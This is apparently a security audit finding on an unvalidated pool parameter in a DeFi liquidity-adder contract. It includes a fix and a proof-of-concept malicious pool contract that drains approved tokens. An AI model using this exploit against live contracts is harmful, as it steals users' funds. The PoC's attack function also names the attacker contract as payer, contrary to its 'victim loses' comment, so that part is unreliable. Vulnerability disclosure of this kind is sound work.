### Title
Unvalidated `pool` Parameter in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain Approved User Tokens — (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address and stores it as the authorised callback caller in transient storage, but never validates it against the factory registry. A malicious frontend can substitute a crafted contract for `pool`; that contract calls `metricOmmModifyLiquidityCallback` and pulls up to `maxAmountToken0 + maxAmountToken1` of any tokens the victim has approved to the adder.

---

### Finding Description

`MetricOmmSimpleRouter` guards every pool interaction with `_requireFactoryPool`: [1](#0-0) 

`MetricOmmPoolLiquidityAdder` has no factory reference and performs no equivalent check. Its own NatSpec acknowledges this: [2](#0-1) 

The attack path runs through `_addLiquidity`: [3](#0-2) 

`_setPayContext` writes the attacker-controlled address as `expectedPool`: [4](#0-3) 

The callback then enforces `msg.sender == expectedPool` — which is satisfied because the malicious pool IS the expected pool: [5](#0-4) 

The callback reads `token0`/`token1` from `IMetricOmmPool(msg.sender).getImmutables()` — the malicious pool controls this return value and can name any tokens the victim has approved: [6](#0-5) 

`pay()` then executes `safeTransferFrom(payer, msg.sender, amount)` where `payer` is the victim and `msg.sender` is the malicious pool: [7](#0-6) 

The same unvalidated `pool` parameter flows through both `addLiquidityWeighted` overloads as well: [8](#0-7) 

---

### Impact Explanation

A victim who has approved `MetricOmmPoolLiquidityAdder` for any ERC-20 token loses up to `maxAmountToken0 + maxAmountToken1` of those tokens in a single transaction. The malicious pool receives the tokens directly; no further interaction is required. This is a direct, irreversible loss of user principal.

---

### Likelihood Explanation

Any user interacting with the adder through a malicious or compromised frontend is at risk. The victim only needs to have a prior approval on the adder (a prerequisite for normal use). The attacker needs to deploy a contract that implements `addLiquidity` (calls the callback with `KIND_PAY`, `amount0Delta = max0`, `amount1Delta = max1`) and `getImmutables` (returns the desired victim tokens). No privileged role is required.

---

### Recommendation

Add a factory reference to `MetricOmmPoolLiquidityAdder` and validate every caller-supplied `pool` address against it before storing it in transient context, mirroring the guard already present in `MetricOmmSwapRouterBase._requireFactoryPool`:

```solidity
// In MetricOmmPoolLiquidityAdder constructor:
IMetricOmmPoolFactory internal immutable FACTORY;
constructor(address weth, address factory) PeripheryPayments(weth) {
    FACTORY = IMetricOmmPoolFactory(factory);
}

// Before _setPayContext in _addLiquidity:
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

This replaces trust in a caller-supplied parameter with trust in on-chain factory state, exactly as the router already does.

---

### Proof of Concept

```solidity
// MaliciousPool.sol
contract MaliciousPool {
    address immutable adder;
    address immutable victim;
    address immutable token0;
    address immutable token1;

    constructor(address _adder, address _victim, address _t0, address _t1) {
        adder = _adder; victim = _victim; token0 = _t0; token1 = _t1;
    }

    // Called by MetricOmmPoolLiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata,
                          bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Trigger callback with max caps
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            MAX0, MAX1, abi.encode(uint8(1)) // KIND_PAY = 1
        );
        return (MAX0, MAX1);
    }

    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token0;
        imm.token1 = token1;
    }
}

// Attack
function attack() external {
    MaliciousPool mp = new MaliciousPool(adder, victim, USDC, WETH);
    // victim has approved adder for USDC and WETH
    LiquidityDelta memory d = /* minimal valid delta */;
    IMetricOmmPoolLiquidityAdder(adder).addLiquidityExactShares(
        address(mp),   // <-- malicious pool, not validated
        victim,        // owner (irrelevant)
        0,             // salt
        d,
        MAX0,          // maxAmountToken0 = full victim USDC balance
        MAX1,          // maxAmountToken1 = full victim WETH balance
        ""
    );
    // victim loses MAX0 USDC + MAX1 WETH; mp receives them
}
```

### Citations

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L106-115)
```text
    try IMetricOmmPoolActions(pool)
      .addLiquidity(owner, salt, weightDeltas, abi.encode(KIND_PROBE), extensionData) returns (
      uint256, uint256
    ) {
      revert WeightedProbeInconclusive();
    } catch (bytes memory reason) {
      (uint256 need0, uint256 need1) = _decodeLiquidityProbeOrBubble(reason);
      LiquidityDelta memory scaled = _scaleWeightsToShares(weightDeltas, maxAmountToken0, maxAmountToken1, need0, need1);
      return _addLiquidity(pool, owner, salt, scaled, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-167)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L183-207)
```text
  function _addLiquidity(
    address pool,
    address positionOwner,
    uint80 salt,
    LiquidityDelta memory deltas,
    address payer,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
    ) {
      amount0Added = a0;
      amount1Added = a1;
      _clearPayContext();
    } catch (bytes memory reason) {
      _clearPayContext();
      assembly ("memory-safe") {
        revert(add(reason, 32), mload(reason))
      }
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L290-296)
```text
  function _setPayContext(address pool, address payer, uint256 maxAmountToken0, uint256 maxAmountToken1) internal {
    if (_tloadAddress(T_SLOT_PAY_POOL) != address(0)) revert PayContextAlreadyActive();
    _tstoreAddress(T_SLOT_PAY_POOL, pool);
    _tstoreAddress(T_SLOT_PAY_PAYER, payer);
    _tstore(T_SLOT_PAY_MAX0, maxAmountToken0);
    _tstore(T_SLOT_PAY_MAX1, maxAmountToken1);
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L85-87)
```text
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
```
